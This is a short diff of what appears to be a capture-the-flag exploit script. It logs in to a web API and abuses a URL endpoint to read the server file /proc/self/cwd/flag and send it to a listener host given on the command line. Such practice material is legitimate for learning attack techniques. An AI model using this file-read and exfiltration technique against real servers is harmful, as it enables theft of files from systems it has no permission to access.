@@ -47,7 +47,7 @@ def getFile(lhost, filename, token):
     requests.post(f'http://{argv[1]}/api/v1/url', json = payload, headers = token)
 
 if __name__ == '__main__':
-    if signup() or True:
+    if signup():
         token = login()
         if token:
             getFile(f'http://{argv[2]}/', '/proc/self/cwd/flag', token)
